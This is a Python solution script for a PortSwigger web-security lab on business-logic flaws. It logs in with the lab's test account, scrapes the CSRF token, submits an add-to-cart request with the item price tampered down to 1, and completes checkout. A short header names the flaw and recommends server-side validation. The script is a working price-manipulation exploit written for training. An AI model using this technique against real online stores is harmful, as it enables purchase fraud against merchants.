'''
Level name: excessive-trust-in-client-side-controls
Link to Level: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

Vulnerability:
    -This lab does not provide a adequate validation for user provided input
    -Allows any client to modify the value of any item by modifying the "price" 
     variable in the "addToCartForm".

Prevention/Remediation:
    -Adding server-side validation 
'''
import requests, sys
from bs4 import BeautifulSoup

s = requests.Session()

site = sys.argv[1]

if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
    print(site)

login_url = f'https://{site}/login'
cart_url = f'https://{site}/cart'
checkout_url = f'{cart_url}/checkout'


productdata = {
    'productId' : "1",
    'redir' : "PRODUCT",
    'quantity' : 1,
    'price' : 1
}

#Gets login page to collect CSRF token
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'username' : "wiener",
    'password' : "peter",
    'csrf' : csrf
}

#Takes the login data from above and posts to page to sign in. 
resp = s.post(login_url, logindata)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

#Sends The requested item above in the modified payload
#with lower pricing
resp = s.post(cart_url, productdata)

checkoutdata = {
    'csrf' : csrf
}

#Posts the checkout data to finalize the transaction
resp = s.post(checkout_url, checkoutdata)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup)
